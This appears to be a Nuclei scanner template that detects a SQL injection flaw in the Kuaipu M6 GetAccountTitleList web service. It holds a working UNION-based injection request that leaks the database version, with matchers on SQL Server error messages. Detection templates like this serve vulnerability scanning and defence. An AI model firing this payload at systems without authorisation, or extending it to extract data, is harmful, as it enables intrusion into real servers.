id: kuaipuM6-GetAccountTitleList-sqli

info:
  name: 快普M6 GetAccountTitleList SQL注入漏洞
  author: kuaipuM6
  severity: high
  tags: sql injection

http:
  - raw:
      - |
        POST /WebService/wsAutoComplete.asmx/GetAccountTitleList HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        prefixText=a'+UNION+ALL+SELECT+@@VERSION,NULL,NULL--&count=1
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '转换成数据类型 int 时失败'
          - '在将 nvarchar 值'
        condition: and
      - type: status
        status: 
          - 500